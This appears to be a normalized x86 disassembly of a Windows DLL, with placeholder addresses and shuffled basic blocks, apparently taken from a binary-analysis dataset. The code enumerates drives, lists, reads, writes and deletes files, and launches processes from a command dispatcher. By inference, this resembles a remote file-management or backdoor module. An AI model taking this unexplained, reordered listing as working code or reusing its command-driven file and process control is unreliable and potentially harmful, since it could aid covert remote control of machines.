call [ CloseEventLog@IAT ]
mov [ ebp - 0x4 ] 0x1
push eax
push r--data
push edi
call ebx
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] ebx
jmp r-xdata
push [ ebp - 0x8 ]
call [ CloseEventLog@IAT ]
push esi
call [ CloseEventLog@IAT ]
sub_1000546c
push 0x42c
push r--data
call sub_10014f80
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x43c ] eax
mov ebx ecx
mov [ ebp - 0x438 ] ebx
and [ ebp - 0x434 ] 0x0
push 0x2f
push ebx
mov esi [ wcsrchr@IAT ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x2f
push ebx
call esi
mov [ ebp - 0x430 ] eax
push ebx
mov edi [ wcslen@IAT ]
call edi
add esp 0xc
lea eax [ ebx + eax * 2 - 0x2 ]
cmp [ ebp - 0x430 ] eax
je r-xdata
push 0x57
pop eax
jmp r-xdata
mov ebx 0x104
push ebx
push 0x2f
push [ ebp - 0x438 ]
call esi
pop ecx
pop ecx
add eax 0x2
push eax
lea eax [ ebp - 0x224 ]
push eax
call [ wcsncpy@IAT ]
xor eax eax
mov [ ebp - 0x1e ] ax
xor esi esi
mov [ ebp - 0x430 ] esi
lea eax [ ebp - 0x224 ]
push eax
call edi
add esp 0x10
test eax eax
je r-xdata
call sub_10014fc8
retn 0x4
mov edi [ ebp - 0x43c ]
movzx eax [ edi + 0x2062c ]
lea ecx [ ebp - 0x224 ]
push ecx
mov ecx eax
imul ecx ecx 0x208
lea ecx [ ecx + edi + 0x34 ]
push ecx
push eax
push r--data
push ebx
lea eax [ ebp - 0x42c ]
push eax
call [ _snwprintf@IAT ]
add esp 0x18
xor eax eax
mov [ ebp - 0x226 ] ax
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x43c ] eax
cmp eax esi
je r-xdata
push 0x5f
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x434 ] eax
push r--data
push eax
call [ GetProcAddress@IAT ]
mov ebx eax
push esi
call [ CoInitialize@IAT ]
cmp ebx esi
je r-xdata
cmp [ eax ] 0x3c
jne r-xdata
mov ecx esi
mov [ eax ] cx
call [ CoUninitialize@IAT ]
push [ ebp - 0x43c ]
call [ FreeLibrary@IAT ]
jmp r-xdata
lea eax [ ebp - 0x42c ]
push eax
push [ ebp - 0x438 ]
push r--data
mov ecx edi
call sub_10004524
add esp 0xc
mov [ ebp - 0x4 ] esi
push esi
push esi
lea eax [ ebp - 0x42c ]
push eax
push [ ebp - 0x438 ]
push esi
call ebx
mov ecx edi
test eax eax
jne r-xdata
cmp [ eax ] 0x3e
jne r-xdata
mov ecx esi
mov [ eax ] cx
mov eax [ ebp - 0x434 ]
push r--data
push r--data
jmp r-xdata
cmp [ eax ] 0x3a
jne r-xdata
mov ecx esi
mov [ eax ] cx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10004524
pop ecx
jmp r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov ecx esi
mov [ eax ] cx
cmp [ eax ] 0x7c
jne r-xdata
mov ecx esi
mov [ eax ] cx
cmp [ eax ] 0x2a
jne r-xdata
mov ecx esi
mov [ eax ] cx
cmp [ eax ] 0x3f
jne r-xdata
mov ecx esi
mov [ eax ] cx
cmp [ eax ] 0x2f
jne r-xdata
mov ecx esi
mov [ eax ] cx
inc [ ebp - 0x430 ]
lea eax [ ebp - 0x224 ]
push eax
call edi
pop ecx
cmp [ ebp - 0x430 ] eax
jb r-xdata
mov ecx esi
mov [ eax ] cx
mov eax [ ebp - 0x430 ]
lea eax [ ebp + eax * 2 - 0x224 ]
cmp [ eax ] 0x5c
jne r-xdata
xor esi esi
sub_100056a9
push 0x210
mov eax sub_100151e7
call sub_10015135
movzx eax [ esi + 0x2062c ]
mov edi ecx
mov ecx eax
imul ecx ecx 0x208
lea ecx [ ecx + esi + 0x34 ]
push ecx
push eax
push r--data
lea eax [ ebp - 0x218 ]
push 0x104
push eax
mov ebx edx
call [ _snwprintf@IAT ]
push 0xa2c
call [ operator new@IAT ]
add esp 0x18
mov [ ebp - 0x21c ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push edi
call [ _wtoi@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x218 ]
push eax
mov eax [ ebp - 0x21c ]
push ebx
call sub_1000386e
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ esi + 0x30 ]
mov ebx eax
test ecx ecx
je r-xdata
push eax
call [ GetProcessVersion@IAT ]
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x30 ] eax
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
and [ esi + 0x30 ] 0x0
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
xor ebx ebx
mov eax ebx
call sub_1000737c
mov edi eax
push edi
push r--data
mov ecx esi
call sub_10004524
pop ecx
pop ecx
push edi
call [ LocalFree@IAT ]
mov eax ebx
call sub_1001517f
retn
sub_10005781
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ DeleteCriticalSection@IAT ]
mov esi [ esi + 0x1c ]
test esi esi
je r-xdata
pop esi
retn
push esi
call [ free@IAT ]
pop ecx
sub_100057a5
push esi
mov esi eax
xor eax eax
cmp [ esi + 0x20 ] eax
je r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
mov eax [ eax ]
mov [ ecx ] eax
dec [ esi + 0x20 ]
mov ecx [ esi + 0x20 ]
mov eax [ esi + 0x1c ]
shl ecx 0x2
push ecx
lea ecx [ eax + 0x4 ]
push ecx
push eax
call [ memmove@IAT ]
add esp 0xc
call sub_1000a151
mov al 0x1
sub_100057da
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005781
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_100057fa
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
lea eax [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov ebx [ free@IAT ]
jmp r-xdata
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov esi [ esi + 0x20 ]
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
test esi esi
jne r-xdata
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x20 ] ecx
call ebx
pop ecx
xor ecx ecx
cmp [ eax + 0x14 ] edi
sete cl
test ecx ecx
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
leave
retn 0x4
mov ecx [ ebp + 0x8 ]
cmp [ eax + 0x10 ] ecx
jne r-xdata
mov esi eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x8 ] ecx
call ebx
pop ecx
jmp r-xdata
xor ecx ecx
cmp [ eax + 0x14 ] edi
sete cl
test ecx ecx
je r-xdata
sub_10005889
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
push edi
lea ebx [ esi + 0x8 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov edi [ free@IAT ]
jmp r-xdata
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ eax + 0x4 ]
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov esi [ esi + 0x20 ]
jmp r-xdata
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x20 ] ecx
call edi
pop ecx
test esi esi
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
cmp [ eax + 0x4 ] ecx
jne r-xdata
mov esi eax
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x8 ] ecx
call edi
pop ecx
jmp r-xdata
sub_100058f2
push ebp
mov ebp esp
push esi
push edi
mov edi 0x8b0
push edi
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx 0x458
push ebx
push 0x0
push esi
call [ memset@IAT ]
and [ esi + 0x4 ] 0x0
mov [ esi ] edi
mov edi [ ebp + 0x10 ]
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov al [ ebp + 0x8 ]
add esp 0xc
cmp [ ebp + 0xc ] 0x0
mov [ esi + 0x18 ] al
je r-xdata
push ebx
lea eax [ esi + 0x458 ]
push edi
push eax
call [ memcpy@IAT ]
add esp 0xc
mov eax esi
pop ebx
push 0x104
push [ ebp + 0xc ]
lea eax [ esi + 0x1a ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi + 0x220 ] ax
sub_10005971
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005991
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_10005991
push esi
mov esi ecx
cmp [ esi + 0x20 ] 0x0
mov [ esi ] r--data
je r-xdata
lea eax [ esi + 0x8 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ esi ] r--data
pop esi
retn
push edi
mov eax [ esi + 0x20 ]
mov edi [ eax + 0x8 ]
push eax
call [ free@IAT ]
pop ecx
mov [ esi + 0x20 ] edi
test edi edi
jne r-xdata
pop edi
sub_100059c9
push esi
mov esi ecx
cmp [ esi + 0x20 ] 0x0
je r-xdata
pop esi
retn
push edi
mov eax [ esi + 0x20 ]
mov edi [ eax + 0x8 ]
push eax
call [ free@IAT ]
pop ecx
mov [ esi + 0x20 ] edi
test edi edi
jne r-xdata
and [ esi + 0x20 ] edi
pop edi
sub_100059ee
push ebp
mov ebp esp
push ecx
call sub_10005a43
test eax eax
je r-xdata
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
sub_10005a0e
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0xc ]
mov ebx ecx
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
pop esi
inc eax
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
call [ memcpy@IAT ]
add esp 0xc
call sub_1000708e
sub_10005a43
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x50c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x508 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ esp + 0x14 ] eax
add eax 0x8
push eax
xor edi edi
xor ebx ebx
xor esi esi
call [ EnterCriticalSection@IAT ]
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x20 ]
cmp eax edi
je r-xdata
mov eax [ esp + 0x14 ]
add eax 0x8
push eax
call [ LeaveCriticalSection@IAT ]
cmp esi edi
jne r-xdata
mov esi eax
mov eax [ esi + 0x4 ]
dec eax
cmp eax 0xe
ja r-xdata
xor eax eax
jmp r-xdata
cmp esi eax
jne r-xdata
mov esi [ esi + 0x8 ]
cmp esi edi
jne r-xdata
cmp [ esi + 0x4 ] 0x7
je r-xdata
jmp [ eax * 4 + jump_table_100067ab ]
mov ecx [ esp + 0x514 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax + 0x8 ]
cmp ecx esi
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ esp + 0x14 ]
mov [ ecx + 0x20 ] eax
jmp r-xdata
cmp [ esi + 0x4 ] 0x7
jne r-xdata
jmp r-xdata
mov eax ebx
push esi
call [ free@IAT ]
pop ecx
mov edi 0x458
push edi
call [ malloc@IAT ]
pop ecx
push edi
mov ebx eax
push 0x0
push ebx
call [ memset@IAT ]
add esp 0xc
mov [ ebx ] edi
push 0x2
pop edi
mov [ ebx + 0x4 ] edi
mov eax [ esi + 0x10 ]
mov [ ebx + 0x10 ] eax
call sub_1000791a
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x58 ]
mov [ esp + 0x10 ] edi
mov edi [ strcpy@IAT ]
mov [ esp + 0xc ] eax
mov ebx 0x100
lea eax [ esi + 0x18 ]
push ebx
push eax
lea eax [ esp + 0x310 ]
push eax
mov [ esp + 0x20 ] edi
call [ wcsncpy@IAT ]
mov edi [ wcslen@IAT ]
xor eax eax
mov [ esp + 0x512 ] ax
lea eax [ esp + 0x314 ]
add esp 0xc
push eax
call edi
cmp [ esp + eax * 2 + 0x30a ] 0x5c
pop ecx
je r-xdata
push 0x1e
lea eax [ esp + 0x2c ]
push edi
push eax
call [ memset@IAT ]
mov [ esp + 0x38 ] 0x4
push 0x1e
lea eax [ esp + 0x2c ]
push edi
push eax
call [ memset@IAT ]
mov eax 0x110
mov [ esp + 0x44 ] ax
lea eax [ esi + 0x18 ]
add esp 0xc
mov [ esp + 0x2c ] 0x3
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] edi
jmp r-xdata
push 0x1e
lea eax [ esp + 0x2c ]
push edi
push eax
call [ memset@IAT ]
mov [ esp + 0x38 ] 0x2
jmp r-xdata
push 0x1e
lea eax [ esp + 0x2c ]
push edi
push eax
call [ memset@IAT ]
mov [ esp + 0x38 ] 0x1
jmp r-xdata
push edi
push 0xa7
push 0x3
push edi
push 0x1
lea eax [ esi + 0x18 ]
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov [ esp + 0x10 ] eax
cmp eax 0xffffffff
jne r-xdata
mov ebx [ wcsrchr@IAT ]
lea eax [ esi + 0x18 ]
push 0x5c
push eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
and [ esp + 0xc ] ebx
and [ esp + 0x10 ] ebx
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x1c ]
lea eax [ esi + 0x18 ]
push eax
push eax
call sub_100067e7
mov eax [ esp + 0x10 ]
imul eax eax 0x230
mov edi 0x458
add eax edi
push eax
call [ malloc@IAT ]
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
xor eax eax
cmp [ esi + 0x42c ] edi
push edi
setne al
push 0x80
add eax 0x2
push eax
push edi
push edi
push __dos_header
lea eax [ esi + 0x18 ]
push eax
call [ CreateFileW@IAT ]
mov [ esp + 0xc ] eax
cmp eax 0xffffffff
jne r-xdata
mov ebx [ memset@IAT ]
push 0x10
lea eax [ esp + 0x2c ]
push edi
push eax
call ebx
add esp 0xc
push 0x44
lea eax [ esp + 0x4c ]
push edi
push eax
call ebx
add esp 0xc
xor eax eax
mov [ esp + 0x78 ] ax
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push edi
push edi
push edi
push edi
push edi
push edi
lea eax [ esi + 0x18 ]
push eax
push edi
mov [ esp + 0x70 ] 0x44
mov [ esp + 0x9c ] 0x1
call [ CreateProcessW@IAT ]
mov [ esp + 0x2e0 ] eax
cmp eax edi
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov eax ecx
cmp eax edi
jne r-xdata
cmp esi edi
jne r-xdata
mov eax [ esp + 0x14 ]
mov esi [ eax + 0x20 ]
inc [ esp + 0x10 ]
add [ esp + 0xc ] 0x18
cmp [ esp + 0x10 ] 0x1a
jl r-xdata
mov eax ecx
add eax 0x41
push eax
lea eax [ esp + 0x2ec ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ esp + 0x2e8 ]
push eax
call [ GetDriveTypeA@IAT ]
dec eax
dec eax
je r-xdata
lea eax [ esp + 0x308 ]
push eax
call edi
pop ecx
sub ebx eax
push ebx
lea eax [ esp + 0x30c ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
lea eax [ esp + 0x90 ]
push eax
lea eax [ esp + 0x30c ]
push eax
call [ FindFirstFileW@IAT ]
mov edi [ FindNextFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
lea eax [ esp + 0x308 ]
push eax
call edi
pop ecx
mov ecx ebx
sub ecx eax
push ecx
lea eax [ esp + 0x30c ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
mov [ esp + 0xc ] edi
call sub_1000737c
mov [ esp + 0xc ] eax
jmp r-xdata
lea eax [ esp + 0x28 ]
push eax
mov [ esp + 0x2c ] edi
call [ SHFileOperationW@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
add esp 0xc
push 0x14
pop eax
mov [ esp + 0x38 ] ax
lea eax [ esi + 0x18 ]
mov [ esp + 0x30 ] eax
lea eax [ esi + 0x220 ]
mov [ esp + 0x34 ] eax
lea ecx [ esp + 0x28 ]
push ecx
push eax
call [ GetFileSizeEx@IAT ]
mov eax [ esi + 0x440 ]
or eax [ esi + 0x444 ]
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
jne r-xdata
call [ GetLastError@IAT ]
call sub_1000737c
push esi
push eax
push edi
mov [ esp + 0x24 ] eax
call sub_100058f2
mov ebx eax
cmp [ esp + 0x18 ] edi
je r-xdata
call sub_1000791a
mov [ esp + 0x28 ] eax
mov [ esp + 0x24 ] 0x2
mov ebx 0x100
lea eax [ esi + 0x18 ]
push eax
lea eax [ esp + 0x30c ]
push eax
call [ wcscpy@IAT ]
lea eax [ esp + 0x310 ]
push 0x5c
push eax
call ebx
xor ecx ecx
mov [ eax ] cx
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esi + 0x18 ]
push 0x5c
push eax
call ebx
pop ecx
pop ecx
mov ecx [ esp + 0x1c ]
add eax 0x2
push eax
lea eax [ esp + 0x314 ]
push eax
call sub_10006d2f
jmp r-xdata
mov eax [ esp + 0x10 ]
imul eax eax 0x230
add eax edi
push eax
push 0x0
push ebx
call [ memset@IAT ]
mov eax [ esp + 0x1c ]
imul eax eax 0x230
add eax edi
mov [ ebx ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esi + 0x10 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x4 ]
add esp 0xc
cmp eax 0x8
je r-xdata
and [ esp + 0x10 ] eax
push edi
call [ malloc@IAT ]
pop ecx
mov ebx eax
push edi
push edi
push [ esi + 0x42c ]
push [ esp + 0x18 ]
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
call sub_1000737c
push esi
push eax
push edi
mov [ esp + 0x24 ] eax
call sub_100058f2
mov ebx eax
cmp [ esp + 0x18 ] edi
je r-xdata
call [ GetLastError@IAT ]
call sub_1000737c
mov [ esp + 0xc ] eax
push [ esp + 0x2c ]
mov ebx [ CloseHandle@IAT ]
call ebx
push [ esp + 0x28 ]
call ebx
mov [ esp + 0xc ] edi
jmp r-xdata
mov edi [ esi + 0x1c ]
push eax
mov eax [ esp + 0x18 ]
call sub_100057fa
mov eax [ esp + 0x14 ]
push 0x7
call sub_10005889
mov eax [ esp + 0x14 ]
push 0x8
call sub_10005889
jmp r-xdata
jmp r-xdata
mov ecx [ esp + 0x10 ]
xor eax eax
inc eax
shl eax cl
test [ ebx + 0x18 ] eax
je r-xdata
jmp r-xdata
cmp [ esp + 0x10 ] 0x2
jge r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x14 ]
imul eax eax 0x230
mov edi 0x458
add eax edi
push eax
call [ malloc@IAT ]
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
mov [ esp + 0x14 ] 0x1
jmp r-xdata
push [ esp + 0xc ]
cmp ebx edi
sete al
cmp [ esi + 0x440 ] ecx
jne r-xdata
mov [ esi + 0x440 ] ecx
mov [ esi + 0x444 ] eax
push [ esi + 0x10 ]
push [ esp + 0x18 ]
call [ LocalFree@IAT ]
inc [ esp + 0x24 ]
cmp [ esp + 0x24 ] 0x1a
jl r-xdata
mov eax ecx
add eax 0x41
push eax
push r--data
lea eax [ esp + 0x310 ]
push ebx
push eax
call [ _snwprintf@IAT ]
mov ecx [ esp + 0x24 ]
add esp 0x10
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x1c ]
push eax
lea eax [ esi + 0x18 ]
push eax
lea eax [ esp + 0x314 ]
push eax
mov [ esp + 0x28 ] edi
mov [ esp + 0x30 ] edi
call sub_10006d2f
cmp [ esp + 0x20 ] edi
je r-xdata
mov eax [ esp + 0x10 ]
imul eax eax 0x230
add eax 0x458
push eax
mov [ esp + 0x2e4 ] eax
call [ malloc@IAT ]
mov ebx eax
mov eax [ esp + 0x2e4 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0xf
mov eax [ esi + 0x10 ]
mov [ ebx + 0x10 ] eax
pop ecx
lea eax [ esi + 0x18 ]
push eax
lea eax [ ebx + 0x18 ]
push eax
call [ wcscpy@IAT ]
mov eax [ esp + 0x18 ]
mov [ ebx + 0x220 ] eax
mov eax [ esp + 0x18 ]
pop ecx
pop ecx
cmp eax edi
je r-xdata
mov edi [ wcsncpy@IAT ]
push 0x104
lea eax [ esi + 0x18 ]
push eax
lea eax [ ebx + 0x18 ]
push eax
call edi
add esp 0xc
push 0x104
lea eax [ esi + 0x220 ]
push eax
lea eax [ ebx + 0x220 ]
push eax
call edi
mov eax [ esi + 0x428 ]
mov [ ebx + 0x428 ] eax
mov eax [ esp + 0x1c ]
mov [ ebx + 0x42c ] eax
add eax 0xfffffff3
cmp eax 0x1
ja r-xdata
push edi
lea eax [ esp + 0x2e4 ]
push eax
push [ esi + 0x430 ]
lea eax [ esi + 0x458 ]
push eax
push [ esp + 0x1c ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
call sub_1000737c
push esi
push eax
push edi
mov [ esp + 0x24 ] eax
call sub_100058f2
mov ebx eax
cmp [ esp + 0x18 ] edi
je r-xdata
push [ esp + 0x18 ]
jmp r-xdata
push esi
push [ esp + 0x10 ]
movzx eax al
push eax
call sub_100058f2
mov ebx eax
cmp [ esp + 0xc ] edi
je r-xdata
cmp [ esp + 0x2e0 ] edi
setne al
jmp r-xdata
push r--data
push r--data
jmp r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
mov edi [ esp + 0x14 ]
imul edi edi 0x230
add edi 0x458
push edi
push 0x0
push ebx
call [ memset@IAT ]
mov [ ebx ] edi
mov [ ebx + 0x4 ] 0x4
mov eax [ esi + 0x10 ]
mov [ ebx + 0x10 ] eax
add esp 0xc
lea eax [ esi + 0x18 ]
push eax
lea eax [ ebx + 0x18 ]
push eax
call [ wcscpy@IAT ]
mov eax [ esp + 0x1c ]
pop ecx
pop ecx
mov [ ebx + 0x220 ] eax
test eax eax
je r-xdata
and [ esp + 0x14 ] eax
push edi
call [ malloc@IAT ]
pop ecx
mov ebx eax
lea eax [ esp + 0x90 ]
push eax
push ebx
call edi
test eax eax
jne r-xdata
mov [ esi + 0x448 ] edi
mov [ esi + 0x44c ] edi
mov [ esi + 0x440 ] ecx
mov [ esi + 0x444 ] eax
cmp [ esi + 0x444 ] eax
jne r-xdata
mov ecx [ esp + 0x24 ]
xor eax eax
inc eax
shl eax cl
test [ esp + 0x28 ] eax
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax edi
jne r-xdata
imul eax eax 0x230
push eax
push [ esp + 0x10 ]
lea eax [ ebx + 0x458 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
jmp r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
imul eax eax 0x230
push eax
push [ esp + 0x10 ]
lea eax [ ebx + 0x458 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov [ ebx + 0x220 ] eax
push 0x104
lea eax [ esi + 0x18 ]
push eax
lea eax [ ebx + 0x18 ]
push eax
call [ wcsncpy@IAT ]
jmp r-xdata
push [ esp + 0xc ]
call [ CloseHandle@IAT ]
mov eax [ esi + 0x430 ]
add eax [ esi + 0x42c ]
cmp eax [ esi + 0x428 ]
jne r-xdata
push [ esp + 0xc ]
jmp r-xdata
push [ esp + 0x18 ]
call [ LocalFree@IAT ]
call [ LocalFree@IAT ]
jmp r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x28 ]
mov [ eax ] ecx
mov ecx [ esp + 0x2c ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x18 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x1c ]
mov [ eax + 0xc ] ecx
lea eax [ esp + 0x2e4 ]
push r--data
jmp r-xdata
dec eax
je r-xdata
lea eax [ esp + 0x90 ]
push eax
lea eax [ esp + 0x30c ]
lea edi [ ebx + 0x458 ]
push eax
mov [ esp + 0x20 ] edi
call [ FindFirstFileW@IAT ]
mov [ esp + 0xc ] eax
inc [ esp + 0x14 ]
push ebx
call [ FindClose@IAT ]
push 0x1858
call [ malloc@IAT ]
mov ebx eax
pop ecx
cmp ebx edi
je r-xdata
jb r-xdata
cmp eax [ esi + 0x44c ]
ja r-xdata
mov ecx [ esp + 0x20 ]
add ecx eax
imul ecx ecx 0x230
push ecx
push [ esp + 0x10 ]
call [ realloc@IAT ]
pop ecx
pop ecx
cmp eax edi
je r-xdata
mov eax [ esp + 0x20 ]
imul eax eax 0x230
push eax
mov [ esp + 0x2e4 ] eax
call [ malloc@IAT ]
pop ecx
push [ esp + 0x2e0 ]
mov ecx [ esp + 0x24 ]
push [ esp + 0x1c ]
mov [ esp + 0x18 ] ecx
push eax
jmp r-xdata
push [ esp + 0xc ]
call [ free@IAT ]
pop ecx
jmp r-xdata
add esp 0xc
push esi
push edi
push 0x1
call sub_100058f2
mov ebx eax
jmp r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
push r--data
jmp r-xdata
dec eax
lea eax [ esp + 0x2e0 ]
je r-xdata
push [ esp + 0xc ]
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ esp + 0x90 ]
push eax
push [ esp + 0x10 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push 0xe
pop eax
call sub_1000737c
push esi
push eax
push edi
mov [ esp + 0x24 ] eax
call sub_100058f2
mov ebx eax
cmp [ esp + 0x18 ] edi
je r-xdata
push 0x1858
push edi
push ebx
call [ memset@IAT ]
add esp 0xc
mov [ ebx ] 0x1858
mov [ ebx + 0x450 ] 0x1400
mov [ ebx + 0x454 ] edi
jmp r-xdata
mov eax [ esi + 0x440 ]
sub eax [ esi + 0x448 ]
add eax 0x458
push eax
mov [ esp + 0x1c ] eax
call [ malloc@IAT ]
mov ebx eax
pop ecx
cmp ebx edi
je r-xdata
cmp ecx 0x1400
jae r-xdata
mov ecx [ esi + 0x440 ]
sub ecx [ esi + 0x448 ]
mov eax [ esi + 0x444 ]
sbb eax [ esi + 0x44c ]
cmp eax edi
ja r-xdata
jb r-xdata
mov ecx [ esp + 0x20 ]
imul ecx ecx 0x230
push ecx
mov ecx [ esp + 0x14 ]
push [ esp + 0x1c ]
imul ecx ecx 0x230
add ecx eax
push ecx
mov [ esp + 0x18 ] eax
call [ memcpy@IAT ]
add esp 0xc
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push 0x104
lea eax [ esp + 0xc0 ]
push eax
push edi
call [ wcsncpy@IAT ]
xor eax eax
mov [ edi + 0x206 ] ax
mov eax [ esp + 0x9c ]
mov [ edi + 0x208 ] eax
mov ecx [ esp + 0xb8 ]
xor eax eax
or eax [ esp + 0xbc ]
xor edi edi
or ecx edi
mov edi [ esp + 0x24 ]
mov [ edi + 0x210 ] eax
mov [ edi + 0x214 ] ecx
mov eax [ esp + 0xa0 ]
mov [ edi + 0x218 ] eax
mov eax [ esp + 0xa4 ]
mov [ edi + 0x21c ] eax
mov eax [ esp + 0xa8 ]
mov [ edi + 0x220 ] eax
mov eax [ esp + 0xac ]
mov [ edi + 0x224 ] eax
mov eax [ esp + 0xb0 ]
mov [ edi + 0x228 ] eax
mov eax [ esp + 0xb4 ]
mov [ edi + 0x22c ] eax
add edi 0x230
add esp 0xc
dec [ esp + 0x14 ]
mov [ esp + 0x18 ] edi
je r-xdata
push [ esp + 0x10 ]
push [ esp + 0x18 ]
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] 0x7
mov eax [ esi + 0x10 ]
mov [ ebx + 0x10 ] eax
push 0x104
lea eax [ esi + 0x18 ]
push eax
lea eax [ ebx + 0x18 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
push 0x104
lea eax [ esi + 0x220 ]
push eax
lea eax [ ebx + 0x220 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
lea eax [ ebx + 0x438 ]
push eax
lea eax [ ebx + 0x430 ]
push eax
lea eax [ ebx + 0x428 ]
push eax
push [ esp + 0x1c ]
call [ GetFileTime@IAT ]
mov eax [ esi + 0x440 ]
mov [ ebx + 0x440 ] eax
mov eax [ esi + 0x444 ]
mov [ ebx + 0x444 ] eax
mov ecx [ esi + 0x448 ]
push edi
mov [ ebx + 0x448 ] ecx
